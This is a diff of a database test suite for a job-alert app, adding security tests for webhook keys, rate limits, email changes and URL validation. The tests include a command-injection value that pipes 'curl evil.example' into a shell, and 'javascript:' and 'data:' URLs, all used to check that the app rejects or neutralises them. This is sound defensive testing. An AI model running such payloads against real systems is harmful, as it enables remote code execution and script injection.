@@ -263,12 +263,17 @@ describe('database', () => {
   it('0011: an inbox address per person; emails are filed under it and only its owner reads them', async () => {
     const [{ token }] = await as<{ token: string }>(JOSH, `select set_inbox(true) as token`);
     expect(token).toMatch(/^[0-9a-f]{10}$/);
-    const file = (t: string) => db.query<{ ok: boolean }>(`select receive_inbound_email($1, 'LinkedIn', 'jobs@linkedin.com', 'New jobs', '<a>x</a>', 'x') as ok`, [t]);
+    const [{ key }] = (await db.query<{ key: string }>(`select inbox_webhook_key() as key`)).rows;
+    expect(key).toMatch(/^[0-9a-f]{64}$/);
+    const file = (t: string, k = key) => db.query<{ ok: boolean }>(`select receive_inbound_email($2, $1, 'LinkedIn', 'jobs@linkedin.com', 'New jobs', '<a>x</a>', 'x') as ok`, [t, k]);
+    await expect(file(token, 'guess')).rejects.toThrow(/wrong key/);
+    await expect(as(JOSH, `select inbox_webhook_key()`)).rejects.toThrow(/permission denied/);
+    await expect(as(JOSH, `select * from private_settings`)).rejects.toThrow(/permission denied/);
     expect((await file(token.toUpperCase())).rows).toEqual([{ ok: true }]);
     expect((await file('nobody')).rows).toEqual([{ ok: false }]);
     expect(await as(JOSH, 'select subject from inbound_emails')).toEqual([{ subject: 'New jobs' }]);
     expect(await as(JAKE, 'select * from inbound_emails')).toEqual([]);
-    await expect(as(JOSH, `select receive_inbound_email('${token}', 'x', 'x', 'x', 'x', 'x')`)).rejects.toThrow(/permission denied/);
+    await expect(as(JOSH, `select receive_inbound_email('k', '${token}', 'x', 'x', 'x', 'x', 'x')`)).rejects.toThrow(/permission denied/);
     await expect(as(JOSH, `update profiles set inbox_token = 'mine'`)).rejects.toThrow(/permission denied/);
 
     // Turned off: the old address stops working.
@@ -279,5 +284,41 @@ describe('database', () => {
     await db.query(`select save_discover_postings($1::jsonb, now())`, [JSON.stringify([{ id: 'e:1', company: 'Corner Store', title: 'Senior PM', url: 'https://x/e1', via: ['LinkedIn alert'], for_profile: JOSH }])]);
     await db.query(`select sync_discover_matches('${JOSH}', $1::jsonb)`, [JSON.stringify([{ posting_id: 'e:1', where_label: 'NYC area', flags: [], on_list: true }])]);
     expect(await as(JOSH, `select m.on_list, d.for_profile = '${JOSH}' as mine from discover_matches m join discover_postings d on d.id = m.posting_id where d.id = 'e:1'`)).toEqual([{ on_list: true, mine: true }]);
+  });
+
+  it('0012: check reasons are fixed text, and one person can only start so many checks', async () => {
+    await db.exec(`delete from check_requests; delete from net.calls;`);
+    await as(JOSH, `select request_check('"; curl evil.example | sh #')`);
+    expect((await db.query<{ reason: string }>(`select body->'inputs'->>'reason' as reason from net.calls`)).rows).toEqual([{ reason: 'check now' }]);
+    expect((await db.query(`select reason from check_requests`)).rows).toEqual([{ reason: 'check now' }]);
+    await db.exec(`select dispatch_check('anything else')`);
+    expect((await db.query<{ reason: string }>(`select body->'inputs'->>'reason' as reason from net.calls order by 1`)).rows.map((r) => r.reason)).toEqual(['check now', 'check now']);
+    await db.exec(`
+      delete from check_requests;
+      insert into check_requests (requested_by, reason, requested_at) select '${JOSH}', 'check now', now() - interval '5 minutes' from generate_series(1, 20);
+    `);
+    await expect(as(JOSH, `select request_check()`)).rejects.toThrow(/lot of checks/);
+    await as(JAKE, `select request_check()`); // someone else still can
+    await db.exec(`delete from check_requests`);
+  });
+
+  it('0012: the alert address only changes when the sign-in address does', async () => {
+    await expect(as(JOSH, `update profiles set email = 'victim@example.com'`)).rejects.toThrow(/permission denied/);
+    await db.exec(`update auth.users set email = 'josh.new@example.com' where id = '${JOSH}'`); // what Supabase does once the link is clicked
+    expect(await as(JOSH, 'select email from profiles')).toEqual([{ email: 'josh.new@example.com' }]);
+    expect(await as(JAKE, 'select email from profiles')).toEqual([{ email: 'jake@example.com' }]);
+  });
+
+  it('0012: limits and web-only links', async () => {
+    await expect(as(JAKE, `select add_watch('${'x'.repeat(121)}', 'greenhouse', 'x')`)).rejects.toThrow(/too long/);
+    await expect(as(JAKE, `select add_watch('Sneaky', null, null, 'javascript:alert(1)')`)).rejects.toThrow(/https/);
+    await db.exec(`insert into watches (profile_id, name) select '${JAKE}', 'c' || g from generate_series(1, 150) g`);
+    await expect(as(JAKE, `select add_watch('One more', 'lever', 'onemore')`)).rejects.toThrow(/limit/);
+    await db.exec(`delete from watches where profile_id = '${JAKE}' and name like 'c%'`);
+
+    await expect(as(JOSH, `insert into verdicts (profile_id, posting_id, verdict, url) values ('${JOSH}', 'manual:1', 'interested', 'javascript:alert(1)')`)).rejects.toThrow(/verdicts_url_web/);
+    await as(JOSH, `insert into verdicts (profile_id, posting_id, verdict, url) values ('${JOSH}', 'manual:1', 'interested', 'https://www.linkedin.com/jobs/view/1/')`);
+    await expect(as(JOSH, `update profiles set criteria = jsonb_build_object('x', repeat('y', 30000))`)).rejects.toThrow(/profiles_criteria_size/);
+    await expect(db.exec(`insert into discover_postings (id, company, title, url) values ('d:bad', 'X', 'Y', 'data:text/html,hi')`)).rejects.toThrow(/discover_postings_url_web/);
   });
 });
